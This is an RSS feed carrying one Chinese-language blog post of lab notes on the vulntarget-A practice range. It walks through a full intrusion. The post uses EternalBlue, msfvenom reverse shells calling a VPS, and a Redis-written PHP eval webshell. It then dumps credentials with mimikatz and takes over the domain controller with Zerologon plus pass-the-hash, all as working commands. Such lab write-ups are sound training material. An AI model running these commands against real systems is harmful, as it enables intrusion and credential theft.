<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>PENTEST on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/pentest/</link><description>Recent content in PENTEST on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 24 Apr 2022 22:08:10 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/pentest/index.xml" rel="self" type="application/rss+xml"/><item><title>vluntargetAÈù∂Âú∫Á¨îËÆ∞</title><link>https://amiaaaz.github.io/2022/04/24/vulntarget-a-notes/</link><pubDate>Sun, 24 Apr 2022 22:08:10 +0800</pubDate><guid>https://amiaaaz.github.io/2022/04/24/vulntarget-a-notes/</guid><description>&lt;blockquote>
&lt;p>Êú¨Êú∫ 192.168.110.131&lt;/p>
&lt;p>Èù∂Êú∫win7 192.168.110.129; 10.0.20.98&lt;/p>
&lt;p>ÂüüÁî®Êà∑win2016 10.0.20.98; 10.0.10.111&lt;/p>
&lt;p>ÂüüÊéßwin2019 10.0.10.110&lt;/p>
&lt;/blockquote>
&lt;p>ËÆøÈóÆ192.168.110.129ÁöÑ80webÈ°µÈù¢ÔºåÊòØÈÄöËææOA&lt;/p>
&lt;p>/inc/expired.phpÈ°µÈù¢Ëé∑ÂæóÁâàÊú¨‰ø°ÊÅØ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220324162505563.png" alt="image-20220324162505563">&lt;/p>
&lt;p>nmapÊâ´‰∏Ä‰∏ãÔºåÂºÄ‰∫Ü445ÁöÑwin7ÔºåËØï‰∏Ä‰∏ãÊ∞∏ÊÅí‰πãËìù&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>use auxiliary/scanner/smb/smb_ms17_010
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>use exploit/windows/smb/ms17_010_eternalblue
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂæóÂà∞shellÔºåÁúã‰∏ãÁΩëÁªú‰ø°ÊÅØ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220324164533684.png" alt="image-20220324164533684">&lt;/p>
&lt;p>Êúâ‰∏Ä‰∏™ÂÜÖÁΩëip 10.0.20.98&lt;/p>
&lt;p>msfÁöÑ‰∏çÁ®≥ÂÆöÔºåÂÅöËøõÁ®ãËøÅÁßªÔºõ‰∏ä‰º†npcÂÅösocks5‰ª£ÁêÜ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>meterpreter &amp;gt; run post/windows/manage/migrate
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>meterpreter &amp;gt; upload /home/kali/t00ls/nps_client_win/npc.exe C:&lt;span style="color:#8045ff">\\&lt;/span>Users
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npc.exe install -server&lt;span style="color:#f92672">=&lt;/span>xxx -vkey&lt;span style="color:#f92672">=&lt;/span>xxx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npc.exe start
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>vim /etc/proxychains4.conf
# proxy dns
socks5 ip port
&lt;/code>&lt;/pre>&lt;p>Âè¶Â§ñ‰º†‰∏Ä‰∏™csÁöÑüêéÂπ∂‰∏äÁ∫ø&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>meterpreter &amp;gt; upload /home/kali/t3mp/cs1.exe C:&lt;span style="color:#8045ff">\\&lt;/span>Users
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>beacon &amp;gt; sleep &lt;span style="color:#ae81ff">5&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÊåÇ‰ª£ÁêÜÂêéÊâ´ÊèèÂÜÖÁΩëcÊÆµ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>proxychains4 nmap -Pn 10.0.20.98/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂèëÁé∞10.0.20.99ÊúâredisÔºåÂ∞ùËØïredisÊú™ÊéàÊùÉÂÜôshellÔºàÂÆûÈôÖËøôÈáåÊâ´Â¥©‰∫ÜÔºåÁõ¥Êé•ÊâìÁöÑ&lt;/p>
&lt;p>Êõ¥ËõãÁñºÁöÑÊòØkaliÂÆâË£Ö‰∏ç‰∫Üredis-cliÔºåÂêÑÁßçÊç¢Ê∫êÈÉΩÊó†Ëß£ÔºåÂè™ËÉΩÊääÂéüÊù•Âè™‰ª£ÁªôÂ±ÄÂüüÁΩëÁöÑÂÜç‰ª£ÁªôÂÖ¨ÁΩëÔºåËøûÂá∫Êù•Êâì&lt;/p>
&lt;p>È¶ñÂÖàÁîüÊàê‰∏™msfüêéËøûÁªôÊàëËá™Â∑±ÁöÑkaliËôöÊãüÊú∫ÔºåËøôÈáåÁöÑÂùëÁÇπÔºö‰∏§Â§ÑÁöÑpayloadË¶Å‰∏•Ê†º‰∏ÄËá¥ÔºàÂà´Â§ö‰∏Ä‰∏™ÊàñÂ∞ë‰∏Ä‰∏™x64ÔºåÂè¶Â§ñlhostËÆæ‰∏∫0.0.0.0ÊâçÂèØ‰ª•Ë¢´‰ª£Âá∫Âéª&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msfvenom -p windows/meterpreter/reverse_tcp &lt;span style="color:#111">LHOST&lt;/span>&lt;span style="color:#f92672">=&lt;/span>vps_ip &lt;span style="color:#111">LPORT&lt;/span>&lt;span style="color:#f92672">=&lt;/span>port -f exe &amp;gt; msfr.exe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; use exploit/multi/handler
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> payload windows/meterpreter/reverse_tcp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> lhost 0.0.0.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> lport &lt;span style="color:#ae81ff">2308&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; run
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÁÑ∂ÂêéÂú®ÂæóÂà∞ÁöÑshellÈáåÊää‰πãÂâçÊ≥®ÂÜåÂ•ΩÁöÑnpcÂèñÊ∂àÊ≥®ÂÜåÂêéÈáçÊñ∞Ê≥®ÂÜå‰∏∫ÂÖ¨ÁΩëÁöÑ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>npc.exe stop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npc.exe uninstall
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npc.exe install -server&lt;span style="color:#f92672">=&lt;/span>xxx -vkey&lt;span style="color:#f92672">=&lt;/span>xxx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npc.exe start
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Âíå‰πãÂâç‰∏ÄÊ†∑ÔºåÊîπproxychainsÁöÑÈÖçÁΩÆÊñá‰ª∂Ôºà‰∏çÂ§çÂà∂‰∫ÜÔºâÔºåwindowsÁî®proxifierÔºà‰πüÂæàÁÆÄÂçïÔºâ&lt;/p>
&lt;p>2308 meterpreter&lt;/p>
&lt;p>2309 socks5 win7 win7123&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>proxychains4 redis-cli -h 10.0.20.99
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; config &lt;span style="color:#111">set&lt;/span> dir &lt;span style="color:#d88200">&amp;#34;C:/phpStudy/PHPTutorial/WWW/&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; config &lt;span style="color:#111">set&lt;/span> dbfilename tx.php
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; &lt;span style="color:#111">set&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;?php @eval(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#d88200">[&amp;#39;ame&amp;#39;]);?&amp;gt;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; save
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ËøûËöÅÂâëÔºåcs‰∏äÁî®‰ª£ÁêÜËΩ¨Âèë‰∏äÁ∫ø via 10.0.20.98ÔºåÊâÄ‰ª•ÈúÄË¶ÅÂÜçÂâçÈù¢ÊääÂÖ¨ÁΩëÁöÑ‰ª£ÁêÜÊç¢ÂõûÂéªÔºåÂÜçuninstall install ‰∏ÄÊ¨°&lt;/p>
&lt;p>Ê≥®ÊÑèÂÆûÊµãpivoting-&amp;gt;ListenerËøôÊ†∑ÁîüÊàêÁöÑÂèçÂêëÈ©¨Âπ∂‰∏çËÉΩÂºπÂõûÊù•ÔºåÂéüÂõ†Êú™Áü•ÔºõËß£ÂÜ≥ÂäûÊ≥ïÊòØÁîüÊàêListener‰∏∫beacon TCPÁöÑÊ≠£ÂêëÈ©¨ÔºåÂÜçÂú®‰πãÂâçÁöÑbeacon‰∏≠connect 10.0.20.99ÔºåÂç≥ÂèØ‰∏äÁ∫ø&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220326114155490.png" alt="image-20220326114155490">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220326114119006.png" alt="image-20220326114119006">&lt;/p>
&lt;p>mimikatzÊäìÂØÜÁ†ÅÔºåÂæóÂà∞ÈùûÊòéÊñáhash&lt;/p>
&lt;p>‰∏ä‰º†msfÊ≠£ÂêëüêéÂπ∂ËøûÊé•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msfvenom -p windows/x64/meterpreter/bind_tcp &lt;span style="color:#111">LPORT&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">6698&lt;/span> -f exe &amp;gt; msfr2.exe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> proxies socks5:192.168.110.131:8879
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; use exploit/multi/handler
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> payload windows/x64/meterpreter/bind_tcp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> lport &lt;span style="color:#ae81ff">6698&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> rhost 10.0.20.99
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; exploit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>meterpreter &amp;gt; run post/windows/manage/migrate
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰ΩÜËøôÈáåÂæóÂà∞ÁöÑsessionÈùûÂ∏∏ÂÆπÊòìÊñ≠ÔºåÂä®‰∏çÂä®Â∞±reason: diedÔºåÂè™ËÉΩÊâãÂä®ÊääÈ©¨ÂíåexploitÂ§öÁî®Âá†Ê¨°&lt;/p>
&lt;p>ÂÆö‰ΩçÂüüÊéß&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>run post/windows/gather/enum_domain
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂæóÂà∞ÂüüÂíåÂüüÊéß‰ø°ÊÅØ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220326163730199.png" alt="image-20220326163730199">&lt;/p>
&lt;p>Ê∑ªÂä†‰∏ªÊú∫ÂØπ10.0.10.*ÁöÑË∑ØÁî±&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">bg&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; sessions x
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>meterpreter &amp;gt; run post/multi/mamage/autoroute
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>nmapÁÆÄÂçïÊâ´‰∏Ä‰∏ã&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>proxychains4 nmap -sS -Pn 10.0.10.110
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Áî®cve-2020-1472ÂüüÂÜÖÊèêÊùÉ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>proxychains4 python3 cve-2020-1472-exploit.py win2019 10.0.10.110
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>proxychains4 python3 secretsdump.py vulntarget.com/win2019&lt;span style="color:#8045ff">\$&lt;/span>@10.0.10.110 -no-pass &lt;span style="color:#75715e"># ÂæóÂà∞administratorÁöÑhash&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>proxychains4 python3 smbexec.py -hashes &amp;lt;hash&amp;gt; administrator@10.0.10.110
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂºÄÂêØËøúÁ®ãÊ°åÈù¢&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>reg add &lt;span style="color:#d88200">&amp;#34;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34;&lt;/span> /t REG_DWORD /v portnumber /d &lt;span style="color:#ae81ff">3389&lt;/span> /f
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wmic RDTOGGLE WHERE &lt;span style="color:#111">ServerName&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;%COMPUTERNAME%&amp;#39;&lt;/span> call SetAllowTSConnections &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>netsh advfirewall firewall add rule &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Remote Desktop&amp;#34;&lt;/span> &lt;span style="color:#111">protocol&lt;/span>&lt;span style="color:#f92672">=&lt;/span>TCP &lt;span style="color:#111">dir&lt;/span>&lt;span style="color:#f92672">=&lt;/span>in &lt;span style="color:#111">localport&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3389&lt;/span> &lt;span style="color:#111">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>allow
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>proxychains rdesktop 10.0.10.110
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item></channel></rss>